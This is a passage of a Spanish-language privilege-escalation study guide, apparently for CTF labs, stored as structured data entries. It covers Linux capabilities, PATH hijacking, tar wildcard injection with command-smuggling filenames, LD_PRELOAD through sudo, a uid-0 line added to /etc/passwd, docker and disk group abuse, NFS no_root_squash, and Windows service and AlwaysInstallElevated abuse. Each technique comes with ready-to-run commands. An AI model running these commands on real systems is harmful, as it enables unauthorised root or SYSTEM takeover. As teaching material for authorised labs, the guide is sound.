            "Usa pspy para cazar tareas periodicas y procesos que no ves con ps puntual.",
            "Cada pista -> validala contra un vector concreto (cron, PATH, servicio) antes de explotar.",
        ],
        "commands": [
            {
                "cmd": "./linpeas.sh -a 2>/dev/null | tee linpeas.txt",
                "why": "Automatiza cientos de checks de privesc en un pase. -a es el modo agresivo; guardar la salida (tee) te deja releerla sin volver a correrlo.",
                "out": "Fijate en lo marcado en rojo/amarillo, sobre todo 'sudo', 'SUID', 'Capabilities', 'Cron', 'Interesting files'. Valida cada uno; hay falsos positivos.",
            },
            {
                "cmd": "./pspy64 -pf -i 1000",
                "why": "Muestra procesos y comandos que arrancan sin necesitar root, ideal para ver cron y tareas que ps puntual no capta. Revela que ejecuta root de forma periodica.",
                "out": "Comandos que aparecen cada X segundos con uid=0. Si alguno llama a un script o binario que puedes escribir, tienes un vector tipo [[cron-abuse]].",
            },
        ],
    },
    {
        "id": "capabilities",
        "title": "Linux capabilities",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Permisos finos que dan a un binario poderes de root concretos; cap_setuid sobre un interprete es escalada directa.",
        "que": "Las capabilities parten los privilegios de root en piezas concretas que se asignan a un binario sin darle SUID completo. Es una version mas granular del [[suid]]: en vez de 'corre como root', es 'puede hacer esta cosa de root'. Algunas capabilities permiten escalar directamente.",
        "porque": "Se usan para que un binario haga una tarea privilegiada (abrir un puerto bajo, cambiar de uid) sin ser root del todo. Pero cap_setuid permite a un interprete (python, perl) cambiar su uid a 0, y cap_dac_read_search permite leer cualquier fichero. Mal puestas, son root.",
        "cuando": "En la enumeracion ([[enum-privesc-linux]]), justo despues de SUID. getcap recorre el sistema buscandolas.",
        "necesitas": [
            "Una shell de usuario en la maquina.",
        ],
        "no_aplica": [
            "getcap -r / no devuelve ningun binario fuera de los estandar del sistema.",
            "Las capabilities presentes no incluyen cap_setuid ni cap_dac_read_search (son inofensivas para privesc).",
        ],
        "confirmacion": "getcap -r / 2>/dev/null y busca cap_setuid o cap_dac_read_search en la salida.",
        "resultado": "Una linea 'binario = cap_setuid+ep' sobre un interprete (python/perl); tras el abuso, euid=0.",
        "senales": [
            "getcap lista un binario con cap_setuid+ep (escalada directa via python/perl).",
            "cap_dac_read_search+ep: lectura de /etc/shadow y cualquier fichero protegido.",
            "cap_setuid sobre un interprete no estandar puesto a proposito en el reto.",
        ],
        "pasos": [
            "Recorre el sistema con getcap -r buscando capabilities en binarios.",
            "Identifica la capability y el binario en GTFOBins (seccion Capabilities).",
            "Si es cap_setuid en python/perl, fuerza setuid(0) y lanza una shell.",
            "Confirma uid=0 y recoge la flag.",
        ],
        "commands": [
            {
                "cmd": "getcap -r / 2>/dev/null",
                "why": "Lista todos los binarios con capabilities asignadas. -r recorre recursivamente; el ruido de permiso denegado se oculta con 2>/dev/null.",
                "out": "Lineas 'binario = cap_xxx+ep'. cap_setuid -> escalada directa (GTFOBins). cap_dac_read_search -> lees /etc/shadow. Ignora los del sistema base.",
            },
            {
                "cmd": "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                "why": "Si python tiene cap_setuid, setuid(0) cambia tu uid a root y luego lanzas una shell que ya corre como root. Es la receta de GTFOBins para esa capability.",
                "out": "Prompt de root y id con uid=0. Cambia python por el interprete concreto que getcap marco con cap_setuid.",
            },
        ],
    },
    {
        "id": "path-hijacking",
        "title": "Secuestro de PATH",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Si un script o SUID que corre como root llama a un binario sin ruta absoluta, colocas tu propio binario antes en el PATH.",
        "que": "Cuando un programa privilegiado invoca otro comando por su nombre (por ejemplo 'cat' en vez de '/bin/cat'), el sistema lo busca por el PATH. Si puedes modificar el PATH o escribir en un directorio que aparezca antes, colocas ahi un binario malicioso con ese nombre y el proceso root ejecuta el tuyo. Otro caso del [[privesc-modelo]].",
        "porque": "El programador uso una ruta relativa por comodidad, confiando en que el PATH apunta a los binarios legitimos. Pero si controlas el PATH (o hay un directorio escribible en el), rompes esa confianza: tu binario se ejecuta con los privilegios del proceso.",
        "cuando": "Cuando un SUID ([[suid]]) o un script de [[cron-abuse]] que corre como root llama a comandos sin ruta absoluta. strings sobre el binario o leer el script lo revela.",
        "necesitas": [
            "Un SUID o script root que invoque un comando SIN ruta absoluta.",
            "Un directorio escribible que puedas anteponer al PATH.",
        ],
        "no_aplica": [
            "El binario/script usa siempre rutas absolutas (/bin/cat, /usr/bin/service).",
            "El proceso privilegiado fija su propio PATH explicitamente antes de ejecutar (no hereda el tuyo).",
        ],
        "confirmacion": "strings sobre el SUID y busca llamadas a comandos sin '/' delante.",
        "resultado": "Un nombre de comando sin ruta absoluta en las strings; tras crear tu binario falso y anteponerlo al PATH, ejecucion como el proceso privilegiado.",
        "senales": [
            "strings de un SUID muestra un comando llamado sin ruta (system(\"service ...\")).",
            "Un script root usa comandos sin path absoluto.",
            "Tienes un directorio escribible que puedes anteponer al PATH.",
        ],
        "pasos": [
            "Detecta el comando invocado sin ruta absoluta (strings o leyendo el script).",
            "Crea un binario/script con ese nombre que lance una shell (o ponga SUID a bash).",
            "Antepon tu directorio al PATH (export PATH=/tmp:$PATH) y dale permiso de ejecucion.",
            "Ejecuta el binario/script privilegiado; correra tu version. Confirma uid=0.",
        ],
        "commands": [
            {
                "cmd": "strings /ruta/al/suid",
                "why": "Revela cadenas del binario, incluidos comandos que llama. Un comando sin '/' es candidato a PATH hijacking; con ruta absoluta, no.",
                "out": "Nombres de comandos invocados. Si ves 'service', 'cat', 'ps' sin ruta, ese es tu punto: crea un binario con ese nombre en un dir que controles.",
            },
            {
                "cmd": "cd /tmp && echo '/bin/bash' > cat && chmod +x cat && export PATH=/tmp:$PATH",
                "why": "Crea un 'cat' falso que lanza bash, y lo pone primero en el PATH. Cuando el proceso root llame a 'cat', ejecutara el tuyo con privilegios de root.",
                "out": "Al ejecutar despues el binario/script privilegiado, obtienes shell root. Restaura el PATH luego para no romper tu propia sesion.",
            },
        ],
    },
    {
        "id": "wildcard-injection",
        "title": "Inyeccion por comodin (wildcard)",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Un comando root con * en un directorio donde puedes crear ficheros: nombras ficheros como flags y el shell los expande a argumentos.",
        "que": "Cuando un script root ejecuta algo como 'tar czf backup.tar.gz *' en un directorio, el shell expande el * a la lista de ficheros ANTES de pasarla al comando. Si puedes crear ficheros ahi, creas ficheros cuyo nombre es en realidad una opcion del comando (como --checkpoint-action de tar), y el comando ejecuta lo que pongas.",
        "porque": "El shell no distingue un fichero llamado '--checkpoint-action=exec=sh script.sh' de una opcion legitima: el glob lo expande igual. tar, chown, rsync y otros tienen flags que ejecutan comandos, y asi el proceso root corre tu codigo. Es un [[privesc-modelo]] via nombres de fichero.",
        "cuando": "Cuando [[cron-abuse]] o un script root usa un comando con * en un directorio escribible por ti. Muy comun con tar en tareas de backup.",
        "necesitas": [
            "Un cron/script root que use un comando con * (tar, chown, rsync) en un directorio escribible por ti.",
        ],
        "no_aplica": [
            "El comando no usa comodines o los ficheros se listan explicitamente por nombre.",
            "El directorio del comodin no es escribible por tu usuario ni grupo.",
        ],
        "confirmacion": "Crea los ficheros con nombres de flags (--checkpoint=1, --checkpoint-action=...) y espera al siguiente ciclo.",
        "resultado": "Tras el ciclo, tu payload se ejecuta como root (comprueba con el binario/flag SUID que hayas preparado).",
        "senales": [
            "Un cron/script root ejecuta tar/chown/rsync con * en una ruta que puedes escribir.",
            "El directorio del comodin es de tu propiedad o escribible por tu grupo.",
            "El comando tiene flags conocidas de ejecucion (tar --checkpoint-action).",
        ],
        "pasos": [
            "Identifica el comando con comodin y el directorio (leyendo el cron/script).",
            "Crea el payload que ejecutara (p. ej. un .sh que ponga SUID a bash).",
            "Crea ficheros cuyos NOMBRES sean las flags que hacen que el comando ejecute tu payload.",
            "Espera a que la tarea corra y recoge tu shell/binario root.",
        ],
        "commands": [
            {
                "cmd": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh",
                "why": "Prepara el payload que el comando privilegiado acabara ejecutando: copia bash con bit SUID para tener luego una shell root.",
                "out": "El fichero shell.sh en el directorio del comodin. Aun no hace nada: falta que el comando root lo invoque via las flags.",
            },
            {
                "cmd": "touch './--checkpoint=1'; touch './--checkpoint-action=exec=sh shell.sh'",
                "why": "Crea ficheros cuyos nombres son opciones de tar. Cuando el cron ejecute 'tar ... *', el glob los mete como argumentos y tar ejecutara shell.sh como root.",
                "out": "Tras correr la tarea, /tmp/rootbash existe con bit SUID: lanzalo con -p para shell root. Ajusta las flags al comando concreto (chown/rsync tienen las suyas).",
            },
        ],
    },
    {
        "id": "sudo-ld-preload",
        "title": "Sudo con env_keep (LD_PRELOAD)",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Si sudo conserva LD_PRELOAD, cargas una libreria tuya en un comando permitido y ejecutas codigo como root.",
        "que": "LD_PRELOAD fuerza al cargador a inyectar una libreria tuya antes que las del sistema en cualquier programa. Si sudo esta configurado con env_keep+=LD_PRELOAD, esa variable sobrevive al sudo y puedes precargar una .so maliciosa en un comando que tengas permitido ejecutar con sudo, corriendo tu codigo como root. Variante avanzada de [[sudo-abuse]].",
        "porque": "El admin conservo variables de entorno por comodidad sin darse cuenta de que LD_PRELOAD permite inyectar codigo. Tu .so define una funcion (por ejemplo el constructor) que lanza una shell; al cargarla en el proceso privilegiado, esa shell es root.",
        "cuando": "Cuando sudo -l ([[sudo-abuse]]) muestra 'env_keep+=LD_PRELOAD' (o LD_LIBRARY_PATH) y tienes algun comando permitido con sudo, aunque sea inofensivo.",
        "necesitas": [
            "sudo -l mostrando env_keep+=LD_PRELOAD (o LD_LIBRARY_PATH).",
            "Al menos un comando permitido con sudo.",
        ],
        "no_aplica": [
            "sudo -l no muestra env_keep para LD_PRELOAD/LD_LIBRARY_PATH.",
            "No tienes gcc en la maquina ni forma de subir una .so ya compilada.",
        ],
        "confirmacion": "Ejecuta el comando permitido con sudo LD_PRELOAD=/tu.so y observa si tu codigo corre.",
        "resultado": "Un prompt de root al ejecutar el comando con la variable precargada.",
        "senales": [
            "sudo -l muestra 'env_keep+=LD_PRELOAD' en la politica.",
            "Tienes al menos un comando ejecutable con sudo.",
            "Puedes compilar en la maquina (gcc presente) o subir la .so ya compilada.",
        ],
        "pasos": [
            "Confirma env_keep+=LD_PRELOAD en sudo -l.",
            "Escribe una .so minima cuyo constructor lance /bin/bash y quite privilegios (setuid(0)).",
            "Compilala como shared object.",
            "Ejecuta un comando permitido con sudo LD_PRELOAD=/ruta/tu.so; obtienes shell root.",
        ],
        "commands": [
            {
                "cmd": "gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles",
                "why": "Compila tu libreria como shared object. -shared la hace precargable; -nostartfiles evita dependencias que romperian la carga en el proceso victima.",
                "out": "El fichero /tmp/pe.so. Su codigo (una funcion _init/constructor que hace setuid(0); system(\"/bin/bash\")) se ejecutara al precargarse.",
            },
            {
                "cmd": "sudo LD_PRELOAD=/tmp/pe.so <comando_permitido>",
                "why": "Al ejecutar el comando permitido con sudo, LD_PRELOAD (conservado por env_keep) carga tu .so en el proceso root y dispara tu shell.",
                "out": "Un prompt de root (id = uid=0). Si da error de carga, revisa que compilaste con -nostartfiles y que env_keep realmente conserva la variable.",
            },
        ],
    },
    {
        "id": "writable-sensitive-files",
        "title": "Ficheros sensibles escribibles",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Si puedes escribir /etc/passwd, /etc/shadow o /etc/sudoers, te conviertes en root editando una linea.",
        "que": "Ciertos ficheros del sistema definen quien es root y quien puede escalar. Si por una mala configuracion de permisos tu usuario puede escribir en /etc/passwd, /etc/shadow o /etc/sudoers, puedes anadir o alterar una cuenta con uid 0 o darte permisos sudo. No hay exploit: es escritura directa a la fuente de la verdad.",
        "porque": "Estos ficheros deberian ser solo-lectura para usuarios normales. Cuando alguien afloja los permisos (o un script los deja escribibles), rompes la frontera de confianza mas basica del sistema: /etc/passwd todavia permite un hash de password en el segundo campo, asi que puedes crear un root con password conocida.",
        "cuando": "Cuando la enumeracion ([[enum-privesc-linux]]) marca /etc/passwd, /etc/shadow o /etc/sudoers como escribibles por ti (ls -l o el check de linpeas).",
        "necesitas": [
            "Una shell de usuario en la maquina.",
        ],
        "no_aplica": [
            "/etc/passwd, /etc/shadow y /etc/sudoers(.d) son todos solo-lectura para tu usuario/grupo.",
        ],
        "confirmacion": "ls -l /etc/passwd /etc/shadow /etc/sudoers y busca un permiso w para ti.",
        "resultado": "Un 'w' en los permisos de alguno de esos ficheros para tu usuario o grupo.",
        "senales": [
            "ls -l /etc/passwd muestra permiso de escritura para tu usuario o grupo.",
            "/etc/shadow legible/escribible (linpeas lo resalta).",
            "Un fichero en /etc/sudoers.d/ escribible por ti.",
        ],
        "pasos": [
            "Comprueba permisos de /etc/passwd, /etc/shadow y /etc/sudoers(.d).",
            "Si /etc/passwd es escribible, genera un hash (openssl passwd) y anade una linea de usuario con uid 0.",
            "Cambia a ese usuario con su y la password que pusiste.",
            "Confirma uid=0. Alternativa: darte una linea NOPASSWD en sudoers.",
        ],
        "commands": [
            {
                "cmd": "ls -l /etc/passwd /etc/shadow /etc/sudoers",
                "why": "Comprueba de un vistazo si tienes escritura en los ficheros que definen identidad y privilegios. Es un check barato con recompensa enorme.",
                "out": "Los permisos. Una 'w' para tu usuario/grupo en cualquiera de ellos es escalada directa. Normalmente solo root escribe; si no, hay mala config.",
            },
            {
                "cmd": "openssl passwd -1 -salt xyz Passw0rd",
                "why": "Genera un hash valido para /etc/passwd. Si passwd es escribible, anades una linea 'hacker:HASH:0:0::/root:/bin/bash' y creas un root con password conocida.",
                "out": "El hash a pegar en el segundo campo. Tras anadir la linea, 'su hacker' con Passw0rd te da uid=0. -1 usa MD5crypt, compatible con /etc/passwd.",
            },
        ],
    },
    {
        "id": "group-abuse-linux",
        "title": "Grupos peligrosos (docker, lxd, disk)",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Pertenecer a ciertos grupos es root casi directo: docker/lxd montan el disco del host; disk lo lee crudo.",
        "que": "Algunos grupos conceden capacidades que equivalen a root aunque tu usuario no lo sea. docker y lxd permiten arrancar un contenedor que monta el sistema de ficheros del host y escribir en el como root. disk da acceso crudo al dispositivo (leer /etc/shadow con debugfs). adm permite leer todos los logs. Es el atajo mas rapido del [[privesc-modelo]].",
        "porque": "Estos grupos existen para administrar subsistemas, pero su poder se traduce trivialmente en root: si controlas el demonio de contenedores puedes montar / del host; si lees el disco crudo, saltas todos los permisos de fichero. Por eso id/groups es lo primero que se mira.",
        "cuando": "Nada mas orientarte con id/groups ([[privesc-modelo]]). Si sales en docker/lxd/disk/adm, prioriza este vector sobre todo lo demas.",
        "necesitas": [
            "Pertenecer a un grupo privilegiado (docker, lxd/lxc, disk, adm).",
        ],
        "no_aplica": [
            "id no muestra ninguno de esos grupos.",
            "El demonio correspondiente (docker/lxd) no esta corriendo pese a estar en el grupo.",
        ],
        "confirmacion": "id para ver tus grupos; si sale docker, prueba docker run -v /:/mnt --rm -it alpine chroot /mnt sh.",
        "resultado": "Una shell dentro del chroot con acceso de escritura a / del host real.",
        "senales": [
            "id muestra tu usuario en docker, lxd/lxc, disk o adm.",
            "El binario docker/lxc responde (el demonio esta corriendo).",
            "Para disk: debugfs puede abrir el dispositivo raiz.",
        ],
        "pasos": [
            "Mira tus grupos con id.",
            "docker: arranca un contenedor montando / del host y chroot para escribir como root.",
            "lxd: importa una imagen y montala con security.privileged para acceder al host.",
            "disk: usa debugfs sobre el dispositivo raiz para leer /etc/shadow o escribir.",
        ],
        "commands": [
            {
                "cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "why": "Si estas en el grupo docker, arrancas un contenedor que monta TODO el disco del host en /mnt y haces chroot: ya eres root sobre los ficheros reales del host.",
                "out": "Una shell root dentro del chroot con acceso a / del host. Desde ahi lees flags, editas /etc/passwd o pones SUID a bash en el host real.",
            },
            {
                "cmd": "debugfs -w /dev/sda1",
                "why": "Con el grupo disk accedes al dispositivo en crudo, saltando permisos de fichero. debugfs -w permite leer y escribir el sistema de ficheros directamente.",
                "out": "Un prompt debugfs. 'cat /etc/shadow' desde ahi ignora permisos. Ajusta /dev/sdaX al dispositivo raiz real (mira lsblk/mount).",
            },
        ],
    },
    {
        "id": "nfs-no-root-squash",
        "title": "NFS con no_root_squash",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Un export NFS con no_root_squash te deja crear ficheros SUID como root desde tu maquina y ejecutarlos en la victima.",
        "que": "no_root_squash es una opcion de NFS que hace que el root de tu maquina sea tratado como root en el servidor NFS (en lugar de degradarlo a nobody). Si un share exportado con esa opcion esta montado en una ruta accesible en la victima, montas el share desde tu Kali (donde SI eres root), creas ahi un binario SUID root, y lo ejecutas en la victima para escalar.",
        "porque": "Normalmente NFS 'aplasta' (squash) el root remoto para que no pueda actuar como root local. no_root_squash desactiva esa proteccion: los ficheros que creas como root en tu maquina conservan uid 0 en el servidor. Un binario SUID creado asi corre como root al ejecutarlo en la victima.",
        "cuando": "Cuando ves NFS (2049) o /etc/exports revela un share con no_root_squash. showmount lista los exports disponibles.",
        "necesitas": [
            "Un export NFS accesible (showmount -e).",
            "Poder montar el share desde tu Kali como root.",
        ],
        "no_aplica": [
            "showmount -e no devuelve ningun export, o el export tiene root_squash activo.",
            "No puedes montar NFS desde tu maquina de ataque (firewall, sin cliente NFS).",
        ],
        "confirmacion": "Monta el share en tu Kali, crea un binario SUID como root, y ejecutalo desde la victima por esa misma ruta.",
        "resultado": "El binario mantiene el bit SUID y euid root al ejecutarse en la victima.",
        "senales": [
            "showmount -e muestra un export disponible.",
            "/etc/exports (legible en la victima) contiene 'no_root_squash'.",
            "El export esta montado o es montable en una ruta util de la victima.",
        ],
        "pasos": [
            "Enumera los exports con showmount -e contra la IP.",
            "Monta el share en tu Kali (como root).",
            "Crea ahi un binario que lance una shell y ponle el bit SUID (como root de tu Kali).",
            "En la victima, ejecuta ese binario desde la ruta del share: correra como root.",
        ],
        "commands": [
            {
                "cmd": "showmount -e $IP",
                "why": "Lista los directorios que el servidor NFS exporta y a quien. Es el primer paso: necesitas saber que share montar y si aplica.",
                "out": "Rutas exportadas y sus restricciones de host. Un export sin restriccion (*) es montable por ti. Luego confirma no_root_squash en /etc/exports.",
            },
            {
                "cmd": "sudo mount -t nfs $IP:/export /mnt/nfs && cd /mnt/nfs",
                "why": "Monta el share en tu Kali, donde eres root. Los ficheros SUID que crees aqui como root conservaran uid 0 en la victima gracias a no_root_squash.",
                "out": "El share montado en /mnt/nfs. Ahora compila un binario que lance bash, hazlo chown root:root y chmod +s; luego ejecutalo en la victima desde esa misma ruta.",
            },
        ],
    },
    {
        "id": "kernel-exploits-linux",
        "title": "Exploits de kernel (ultimo recurso)",
        "phase": "privesc",
        "section": "linux-privesc",
        "summary": "Si el kernel es viejo, un exploit local eleva a root; deja esto para el final porque puede tumbar la maquina.",
        "que": "Un exploit de kernel aprovecha un fallo en el propio nucleo de Linux para ejecutar codigo como root desde un usuario normal. Casos famosos: DirtyCow, PwnKit (polkit), DirtyPipe. Funcionan cuando la version del kernel o de un componente del sistema es vulnerable, independientemente de la config.",
        "porque": "Se dejan para el FINAL por dos razones: los exploits de kernel pueden causar un kernel panic y tumbar la maquina (arruinando la room), y muchas veces hay un vector de config mas limpio y estable. Solo cuando la enumeracion ([[enum-privesc-linux]]) no dio nada mejor, se recurre a esto.",
        "cuando": "Cuando ningun vector de config (sudo, SUID, cron, capabilities) funciono y uname -r revela un kernel viejo o hay un componente vulnerable (polkit, sudo Baron Samedit).",
        "necesitas": [
            "Version exacta del kernel (uname -a) y de componentes clave (sudo, polkit).",
        ],
        "no_aplica": [
            "El kernel/distro esta parcheado contra los CVEs conocidos para esa version.",
            "Quedan vectores de configuracion sin probar (sudo, SUID, cron): prueba esos primero.",
        ],
        "confirmacion": "Compara uname -a con CVEs conocidos (DirtyCow, PwnKit, DirtyPipe) para ese rango de version.",
        "resultado": "Tras ejecutar el exploit compilado, un prompt root y uid=0. Si no aplica, la maquina puede quedar inestable: usalo con cuidado.",
        "senales": [
            "uname -r muestra un kernel antiguo con CVE conocido.",
            "linpeas sugiere exploits de kernel aplicables.",
            "Componentes vulnerables presentes (pkexec para PwnKit, sudo < 1.9.5p2 para Baron Samedit).",
        ],
        "pasos": [
            "Saca la version exacta con uname -a y las versiones de sudo/polkit.",
            "Busca un exploit para ESA version y leelo antes de ejecutarlo ([[explotar-cve]]).",
            "Compila en una maquina compatible (o en la victima si hay gcc) y transfierelo.",
            "Ejecuta con cuidado; confirma uid=0. Si falla o cuelga, vuelve a los vectores de config.",
        ],
        "commands": [
            {
                "cmd": "uname -a; cat /etc/os-release",
                "why": "La version exacta del kernel y de la distro es lo que decide que exploit aplica. Un exploit para otra version puede no funcionar o tumbar la maquina.",
                "out": "Version del kernel (ej. 4.4.0) y distro. Cruzalo con searchsploit/CVEs; kernels < ~4.8 huelen a DirtyCow, cualquiera con pkexec vulnerable a PwnKit.",
            },
            {
                "cmd": "searchsploit linux kernel <version>",
                "why": "Busca exploits locales publicos para esa version concreta de kernel. Prioriza los locales (Local Privilege Escalation) sobre los remotos.",
                "out": "Titulos con su rango de version. Lee el PoC antes de lanzarlo ([[explotar-cve]]); comprueba que la version encaja para no arriesgar un panic.",
            },
        ],
    },
    {
        "id": "enum-privesc-windows",
        "title": "Enumeracion para privesc en Windows",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Igual que en Linux pero con otros checks: privilegios de token, servicios, credenciales guardadas y parches faltantes.",
        "que": "Enumerar para privesc en Windows es recorrer sus vectores tipicos en orden: privilegios de token, grupos, servicios mal configurados, tareas programadas, credenciales guardadas y parches faltantes. WinPEAS lo automatiza; entender cada hallazgo es lo que lo convierte en escalada. Paso previo del [[winprivesc-modelo]].",
        "porque": "Windows esconde muchos vectores en configuracion (servicios, registro, permisos NTFS) que a mano son tediosos. WinPEAS y las consultas manuales garantizan cobertura, pero dan falsos positivos: hay que validar cada pista.",
        "cuando": "Nada mas conseguir una shell en Windows. Corre primero whoami /priv y whoami /groups, luego WinPEAS para lo exhaustivo.",
        "necesitas": [
            "Una shell de usuario en Windows.",
        ],
        "no_aplica": [
            "Ya recorriste privilegios de token, servicios y credenciales sin hallazgos.",
        ],
        "confirmacion": "whoami /priv y whoami /groups primero; despues winPEAS para el resto.",
        "resultado": "Un privilegio de token Enabled, o un hallazgo resaltado en winPEAS (servicio, credencial, AlwaysInstallElevated).",
        "senales": [
            "whoami /priv revela un privilegio potente (SeImpersonate, SeBackup, SeDebug).",
            "WinPEAS resalta servicios modificables o rutas sin comillas.",
            "Credenciales en ficheros de despliegue o en el gestor de credenciales.",
        ],
        "pasos": [
            "Checks rapidos: whoami /priv, whoami /groups, systeminfo (parches).",
            "Lanza WinPEAS y lee lo resaltado (servicios, credenciales, AlwaysInstallElevated).",
            "Prioriza por rentabilidad: token ([[token-impersonation]]) y servicios ([[service-misconfig-windows]]) primero.",
            "Deja los exploits de kernel ([[kernel-exploits-windows]]) para el final.",
        ],
        "commands": [
            {
                "cmd": "whoami /priv",
                "why": "Lista tus privilegios de token, el vector mas rapido en Windows. Varios (SeImpersonate, SeBackup, SeRestore, SeDebug) llevan a SYSTEM casi directo.",
                "out": "Privilegios y si estan Enabled. SeImpersonate -> [[token-impersonation]]. SeBackup/SeRestore -> [[sebackup-serestore]]. Anota los que esten habilitados.",
            },
            {
                "cmd": "systeminfo",
                "why": "Muestra version de Windows y hotfixes instalados. Comparar los parches con los CVE conocidos revela si hay un exploit de kernel aplicable.",
                "out": "OS version, build y lista de KB (parches). Pocos KB en un Windows viejo -> candidato a exploit de kernel; pasalo por Watson/wesng.",
            },
        ],
    },
    {
        "id": "service-misconfig-windows",
        "title": "Servicios mal configurados",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Un servicio que corre como SYSTEM con permisos flojos: si modificas su binario, su binPath o una ruta sin comillas, ejecutas como SYSTEM.",
        "que": "Los servicios de Windows suelen correr como SYSTEM. Si tu usuario puede modificar la configuracion del servicio (binPath), reemplazar su ejecutable, o si la ruta del binario no esta entre comillas y hay un directorio escribible en medio, puedes hacer que el servicio ejecute TU binario como SYSTEM. Es el [[winprivesc-modelo]] aplicado a servicios.",
        "porque": "Instaladores descuidados dejan servicios con permisos NTFS flojos en el .exe o permiten a usuarios normales reconfigurar el servicio. Y una ruta como C:\\Program Files\\My App\\svc.exe sin comillas hace que Windows pruebe C:\\Program.exe primero: si puedes escribir ahi, secuestras el arranque.",
        "cuando": "En la enumeracion ([[enum-privesc-windows]]). WinPEAS marca servicios modificables, binarios escribibles y unquoted paths.",
        "necesitas": [
            "Una shell de usuario en Windows.",
            "accesschk o permisos NTFS consultables sobre servicios.",
        ],
        "no_aplica": [
            "Todos los servicios corren con permisos correctos y rutas entre comillas.",
            "No tienes SERVICE_CHANGE_CONFIG ni escritura sobre ningun binario de servicio.",
        ],
        "confirmacion": "sc qc <servicio> para ver BINARY_PATH_NAME y SERVICE_START_NAME; cruzalo con accesschk.",
        "resultado": "Una ruta sin comillas con directorio intermedio escribible, o permiso de reconfigurar el servicio (SERVICE_CHANGE_CONFIG).",
        "senales": [
            "accesschk o WinPEAS marca SERVICE_CHANGE_CONFIG o WRITE sobre un servicio.",
            "El .exe del servicio esta en una carpeta escribible por tu usuario.",
            "Una ruta de servicio con espacios y sin comillas, con un dir intermedio escribible.",
        ],
        "pasos": [
            "Enumera servicios y sus permisos (accesschk / sc qc).",
            "Segun el fallo: reconfigura binPath, reemplaza el .exe, o coloca un exe en la ruta sin comillas.",
            "Reinicia el servicio (o espera) para que ejecute tu payload como SYSTEM.",
            "Confirma con whoami que eres nt authority\\system.",
        ],
        "commands": [
            {
                "cmd": "sc qc <servicio>",
                "why": "Muestra la configuracion del servicio: su BINARY_PATH_NAME y la cuenta con la que corre. Ahi ves si la ruta esta sin comillas y si corre como LocalSystem.",
                "out": "BINARY_PATH_NAME (mira comillas y espacios) y SERVICE_START_NAME (LocalSystem = SYSTEM). Combinar con accesschk revela si puedes modificarlo.",
            },
            {
                "cmd": "sc config <servicio> binPath= \"C:\\Windows\\Temp\\pe.exe\" && sc start <servicio>",
                "why": "Si tienes SERVICE_CHANGE_CONFIG, reescribes que ejecuta el servicio y lo arrancas: tu binario correra como SYSTEM. Es el abuso mas directo.",
                "out": "El servicio ejecuta tu pe.exe como SYSTEM (crea un usuario admin o lanza tu shell). Si no puedes cambiar config, prueba reemplazar el .exe o el unquoted path.",
            },
        ],
    },
    {
        "id": "always-install-elevated",
        "title": "AlwaysInstallElevated",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Si esta politica esta activa, cualquier .msi se instala como SYSTEM: generas un instalador malicioso y listo.",
        "que": "AlwaysInstallElevated es una politica de Windows que, si esta activada en las dos claves de registro (HKCU y HKLM), hace que cualquier paquete .msi se instale con privilegios de SYSTEM sin importar quien lo lance. Un atacante genera un .msi malicioso y lo instala para ejecutar codigo como SYSTEM.",
        "porque": "La politica existe para que usuarios sin privilegios puedan instalar software aprobado, pero abre un agujero enorme: el instalador corre como SYSTEM y el .msi puede hacer cualquier cosa. Es un vector limpio y fiable cuando esta activo. Caso del [[winprivesc-modelo]].",
        "cuando": "En la enumeracion ([[enum-privesc-windows]]). Se comprueba leyendo las dos claves de registro; WinPEAS lo marca explicitamente.",
        "necesitas": [
            "Una shell de usuario en Windows con acceso al registro (reg query).",
        ],
        "no_aplica": [
            "Cualquiera de las dos claves (HKCU o HKLM) vale 0 o no existe.",
        ],
        "confirmacion": "reg query en ambas claves AlwaysInstallElevated (HKCU y HKLM); las dos deben ser 0x1.",
        "resultado": "0x1 en ambas claves. Tras instalar tu .msi, tu usuario aparece en el grupo Administrators.",
        "senales": [
            "Ambas claves AlwaysInstallElevated valen 1 (HKCU y HKLM).",
            "WinPEAS resalta 'AlwaysInstallElevated set to 1'.",
        ],
        "pasos": [
            "Comprueba las dos claves de registro; deben valer 1 las dos.",
            "Genera un .msi malicioso (crea un admin o lanza tu shell).",
            "Transfierelo e instalalo con msiexec en modo silencioso.",
            "Confirma privilegios de SYSTEM/admin.",
        ],
        "commands": [
            {
                "cmd": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "why": "Comprueba la clave de usuario. La escalada solo funciona si tanto HKCU como HKLM tienen AlwaysInstallElevated = 1; una sola no basta.",
                "out": "El valor (0x1 = activado). Repite la consulta en HKLM. Si ambas son 0x1, el vector aplica.",
            },
            {
                "cmd": "msiexec /quiet /qn /i C:\\Windows\\Temp\\pe.msi",
                "why": "Instala tu .msi en silencio. Con la politica activa, msiexec lo ejecuta como SYSTEM, corriendo el payload que metiste dentro (crear admin o shell).",
                "out": "El payload se ejecuta como SYSTEM (p. ej. tu usuario nuevo aparece en 'net localgroup administrators'). Genera el .msi con la accion deseada de antemano.",
            },
        ],
    },
    {
        "id": "stored-credentials-windows",
        "title": "Credenciales guardadas en Windows",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "Windows deja credenciales por todas partes: ficheros de despliegue, gestor de credenciales, registro y backups del SAM.",
        "que": "Muchas escaladas en Windows no son un exploit, sino encontrar una credencial reutilizable. Windows guarda passwords en ficheros de despliegue (unattend.xml, sysprep), en el gestor de credenciales (cmdkey), en el registro (Winlogon autologon, PuTTY), y en backups del SAM/SYSTEM que se pueden volcar. Cada credencial alimenta [[cracking]] o reuse directo.",
        "porque": "Los administradores automatizan despliegues y dejan credenciales en claro o cifradas de forma reversible. Y el propio Windows cachea secretos para comodidad. Buscar sistematicamente es de lo mas rentable, igual que en Linux.",
